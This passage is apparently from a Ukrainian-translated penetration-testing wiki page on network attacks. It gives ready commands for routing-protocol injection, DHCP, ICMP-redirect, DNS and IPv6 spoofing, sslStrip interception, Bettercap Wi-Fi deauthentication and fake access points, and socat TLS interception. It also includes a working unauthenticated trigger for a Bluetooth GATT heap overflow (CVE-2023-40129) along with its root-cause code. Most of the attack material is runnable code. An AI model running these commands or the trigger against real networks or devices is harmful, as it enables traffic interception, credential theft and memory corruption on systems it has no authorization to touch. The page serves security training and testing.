Зверніть увагу, що RIPv2 підтримує MD5 authentication, тоді як RIPng не має вбудованої автентифікації і покладається на IPsec AH та ESP у IPv6.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)** — динамічний протокол маршрутизації. **Це протокол з вектором відстані.** Якщо відсутня автентифікація та налаштування passive interfaces, **зловмисник** може втрутитися в маршрутизацію EIGRP і спричинити **отруєння таблиць маршрутизації**. Крім того, мережа EIGRP (іншими словами, autonomous system) **є плоскою і не має сегментації на зони**. Якщо **атакуючий вводить маршрут**, ймовірно, що цей маршрут **розповсюдиться** по всій автономній системі EIGRP.

Для атаки на систему EIGRP потрібно встановити **neighbourhood** з легітимним EIGRP маршрутизатором, що відкриває багато можливостей — від базової розвідки до різних ін’єкцій.

[**FRRouting**](https://frrouting.org/) дозволяє реалізувати віртуальний маршрутизатор, що підтримує BGP, OSPF, EIGRP, RIP та інші протоколи. Все, що потрібно — розгорнути його на системі зловмисника, і ви зможете видавати себе за легітимний маршрутизатор у домені маршрутизації.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) має можливості перехоплення EIGRP broadcast-ів. Він також дозволяє інжектувати пакети, що може бути використано для зміни конфігурацій маршрутизації.

### OSPF

У Open Shortest Path First (OSPF) протоколі зазвичай використовується MD5 authentication для забезпечення безпечного зв’язку між маршрутизаторами. Проте цей механізм безпеки можна скомпрометувати за допомогою інструментів, таких як Loki та John the Ripper. Ці інструменти здатні перехоплювати та ламати MD5 hashes, виявляючи ключ автентифікації. Після отримання цього ключа його можна використати для введення нової інформації про маршрути. Для налаштування параметрів маршруту та встановлення скомпрометованого ключа відповідно використовуються вкладки _Injection_ та _Connection_.

- **Capturing and Cracking MD5 Hashes:** Для цього використовуються інструменти на кшталт Loki та John the Ripper.
- **Configuring Route Parameters:** Це робиться через вкладку _Injection_.
- **Setting the Compromised Key:** Ключ налаштовується у вкладці _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Інструмент для сканування мережевого трафіку та виявлення вразливостей
- Ви можете знайти більше інформації про network attacks [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Зловмисник конфігурує всі мережеві параметри (GW, IP, DNS) для нового учасника мережі, відправляючи підроблені DHCP-відповіді.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Перегляньте [previous section](#arp-spoofing).

### ICMPRedirect

ICMP Redirect полягає у надсиланні ICMP пакета типу 1, коду 5, що вказує, що атакуючий є найкращим шляхом для досягнення IP. Потім, коли жертва хоче зв'язатися з цією IP, вона відправить пакет через атакуючого.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

The attacker буде resolve деякі (або всі) domains, які victim запитує.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Налаштувати власний DNS за допомогою dnsmasq**
```bash
apt-get install dnsmasq
echo "addn-hosts=dnsmasq.hosts" > dnsmasq.conf
echo "127.0.0.1   domain.example.com" > dnsmasq.hosts
sudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Локальні шлюзи

Часто існує кілька маршрутів до систем та мереж. Після складання списку MAC-адрес у локальній мережі, використайте _gateway-finder.py_ щоб визначити хости, які підтримують IPv4 forwarding.

<details>
<summary>Приклад використання gateway-finder</summary>
```bash
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
</details>


### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Для локального розв'язання імен, коли DNS-запити неуспішні, системи Microsoft покладаються на **Link-Local Multicast Name Resolution (LLMNR)** і **NetBIOS Name Service (NBT-NS)**. Аналогічно, **Apple Bonjour** і **Linux zero-configuration** реалізації використовують **Multicast DNS (mDNS)** для виявлення систем у мережі. Через відсутність автентифікації в цих протоколах та їх роботу поверх UDP із широкомовними повідомленнями, їх можуть використовувати атакувальники, які прагнуть перенаправити користувачів на зловмисні сервіси.

Ви можете видавати себе за сервіси, які шукають хости, використовуючи Responder для відправлення фальшивих відповідей.\
Детальніше читайте про [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Браузери зазвичай використовують протокол **Web Proxy Auto-Discovery (WPAD) для автоматичного отримання налаштувань proxy**. Це включає отримання конфігураційних даних із сервера, зокрема через URL на кшталт "http://wpad.example.org/wpad.dat". Виявлення цього сервера клієнтами може відбуватися різними механізмами:

- Через **DHCP**, де виявлення спрощується за допомогою спеціального запису з кодом 252.
- Через **DNS**, що передбачає пошук імені хоста з позначенням _wpad_ у локальному домені.
- Через **Microsoft LLMNR and NBT-NS**, які є fallback-методами у випадках, коли DNS-запити не вдаються.

Інструмент Responder використовує цей протокол, виступаючи як **зловмисний WPAD server**. Він застосовує DHCP, DNS, LLMNR і NBT-NS, щоб ввести клієнтів в оману й змусити їх підключитися до нього. Щоб докладніше дізнатися, як сервіси можуть бути підроблені за допомогою Responder, [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Ви можете запропонувати різні сервіси в мережі, щоб спробувати обдурити користувача і змусити його ввести деякі **plain-text credentials**. **Більше інформації про цю атаку в** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

This attack is very similar to ARP Spoofing but in the IPv6 world. Ви можете змусити жертву думати, що IPv6 адреса GW має MAC атакуючого.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Деякі ОС за замовчуванням налаштовують шлюз на основі RA-пакетів, що надсилаються в мережі. Щоб оголосити атакуючого як IPv6 router, ви можете використати:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

За замовчуванням деякі OS намагаються налаштувати DNS, читаючи DHCPv6-пакет у мережі. Тоді зловмисник може відправити DHCPv6-пакет, щоб налаштувати себе як DNS. DHCP також надає жертві IPv6-адресу.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (фейкова сторінка та ін'єкція JS-коду)

## Інтернет-атаки

### sslStrip

По суті, ця атака полягає в тому, що у випадку коли **user** намагається **access** до **HTTP** сторінки, яка **redirecting** на версію **HTTPS**. **sslStrip** буде **maintain** **HTTP connection with** **client and** **HTTPS connection with** **server**, тож воно зможе **sniff** з'єднання у **plain text**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ and dns2proxy для обходу HSTS

The **різниця** between **sslStrip+ and dns2proxy** against **sslStrip** is that they will **перенаправляти** for example _**www.facebook.com**_ **to** _**wwww.facebook.com**_ (note the **extra** "**w**") and will set the **address of this domain as the attacker IP**. This way, the **client** will **connect** to _**wwww.facebook.com**_ **(the attacker)** but behind the scenes **sslstrip+** will **maintain** the **real connection** via https with **www.facebook.com**.

The **мета** of this technique is to **обійти HSTS** because _**wwww**.facebook.com_ **won't** be saved in the **cache** of the browser, so the browser will be tricked to perform **facebook authentication in HTTP**.\
Note that in order to perform this attack the victim has to try to access initially to [http://www.faceook.com](http://www.faceook.com) and not https. This can be done modifying the links inside an http page.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ більше не працюють. Це тому, що в браузерах є попередньо збережені правила HSTS, тому навіть якщо це перший раз, коли користувач заходить на "важливий" домен, він підключиться через HTTPS. Також зауважте, що попередньо збережені правила та інші згенеровані правила можуть використовувати прапорець** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP прослуховування на порту
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL прослуховування порту

#### Згенерувати ключі та самопідписаний сертифікат
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Прослуховування з використанням сертифіката
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Прослуховувати з використанням certificate та перенаправляти на hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Іноді, якщо клієнт перевіряє, що CA є дійсним, ви можете **serve a certificate of other hostname signed by a CA**.\
Ще один цікавий тест — подати c**ertificate of the requested hostname but self-signed**.

Ще можна спробувати підписати certificate дійсним certificate, який не є дійсним CA. Або використати дійсний public key, змусити використовувати алгоритм diffie hellman (той, що не вимагає розшифровувати нічого за допомогою реального private key), і коли клієнт запитує probe реального private key (наприклад, hash) — відправити фальшивий probe і очікувати, що клієнт цього не перевірить.

## Bettercap

<details>
<summary>Поширені команди Bettercap</summary>
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
</details>


### Active Discovery Notes

Майте на увазі, що коли UDP пакет відправляється на пристрій, який не має запитаного порту, надсилається ICMP (Port Unreachable).

### **ARP discover**

ARP пакети використовуються для виявлення, які IP-адреси використовуються в мережі. ПК повинен відправити запит для кожної можливої IP-адреси, і лише ті, що використовуються, відповідають.

### **mDNS (multicast DNS)**

Bettercap відправляє MDNS-запит (кожні X мс), запитуючи **\_services\_.dns-sd.\_udp.local**; машина, що бачить цей пакет, зазвичай відповідає на цей запит. Потім він шукає лише машини, що відповідають на "services".

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap відправляє broadcast-пакети на порт 137/UDP з запитом імені "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap відправляє SSDP broadcast-пакети в пошуку всіх типів сервісів (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap відправляє WSD broadcast-пакети в пошуку сервісів (UDP Port 3702).


## Bluetooth (L2CAP/ATT/GATT) Attacks

- Android Fluoride exposes services over L2CAP PSMs (e.g., SDP 0x0001, RFCOMM 0x0003, BNEP 0x000F, AVCTP 0x0017/0x001B, AVDTP 0x0019, ATT/GATT 0x001F). Services register via:
```c
uint16_t L2CA_Register2(uint16_t psm, const tL2CAP_APPL_INFO& p_cb_info,
bool enable_snoop, tL2CAP_ERTM_INFO* p_ertm_info,
uint16_t my_mtu, uint16_t required_remote_mtu,
uint16_t sec_level);
```
- BlueBlue framework дозволяє Scapy-based L2CAP/ATT crafting (побудований на BlueBorne l2cap_infra). Приклад:
```python
acl  = ACLConnection(src_bdaddr, dst_bdaddr, auth_mode='justworks')
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=672)
gatt.send_frag(p8(GATT_READ)+p16(1234))
print(gatt.recv())
```
- CVE-2023-40129 (Fluoride GATT): integer underflow у Read Multiple Variable response builder може спричинити ~64KB heap overflow, коли MTU обрізає variable-length element, але поле довжини +2 не враховано.

<details>
<summary>Основна причина (GATT Read Multiple Variable)</summary>
```c
static void build_read_multi_rsp(tGATT_SR_CMD* p_cmd, uint16_t mtu) {
uint16_t ii, total_len, len; uint8_t* p; bool is_overflow=false;
len = sizeof(BT_HDR) + L2CAP_MIN_OFFSET + mtu;
BT_HDR* p_buf = (BT_HDR*)osi_calloc(len); p_buf->offset=L2CAP_MIN_OFFSET;
p = (uint8_t*)(p_buf + 1) + p_buf->offset; *p++ = GATT_RSP_READ_MULTI_VAR;
p_buf->len=1;
for (ii=0; ii<p_cmd->multi_req.num_handles; ii++) {
tGATTS_RSP* p_rsp = ...; // dequeued
if (p_rsp) {
total_len = (p_buf->len + p_rsp->attr_value.len);
if (p_cmd->multi_req.variable_len) total_len += 2;
if (total_len > mtu) {
len = p_rsp->attr_value.len - (total_len - mtu); // BUG: ignores +2
is_overflow = true;
} else { len = p_rsp->attr_value.len; }
if (p_cmd->multi_req.variable_len) { UINT16_TO_STREAM(p, len); p_buf->len += 2; }
memcpy(p, p_rsp->attr_value.value, len); // heap overflow
if (!is_overflow) p += len; p_buf->len += len; if (is_overflow) break;
}
}
}
```
- У записах змінної довжини шлях переповнення віднімає лише (total_len - mtu), ігноруючи поле довжини +2, тож len зазнає underflow (наприклад, 0xFFFE) і memcpy записує ~64KB за межі buffer.
</details>

- Мінімальний неаутентифікований trigger (малий MTU примушує underflow на 4-му атрибуті):
```python
# GATT_REQ_READ_MULTI_VAR (0x20), MTU=55
acl  = ACLConnection(interface, bdaddr)
gatt = acl.l2cap_connect(psm=PSM_ATT, mtu=55)
pkt  = b'\x20'  # opcode
pkt += p16(9); pkt += p16(9); pkt += p16(9); pkt += p16(9)
gatt.send(pkt)
# On 4th insert: p_buf->len=55 (1 + 3*(16+2)), total_len=73 -> len=16-(73-55)=-2 -> ~64KB overwrite
```
### Телеком / Mobile-Core (GTP) Exploitation


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## Джерела

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Paint it blue: Attacking the bluetooth stack (Synacktiv)](https://www.synacktiv.com/en/publications/paint-it-blue-attacking-the-bluetooth-stack)
- [BlueBorne L2CAP testing infra (l2cap_infra)](https://github.com/ArmisSecurity/blueborne/tree/master/l2cap_infra)



{{#include ../../banners/hacktricks-training.md}}
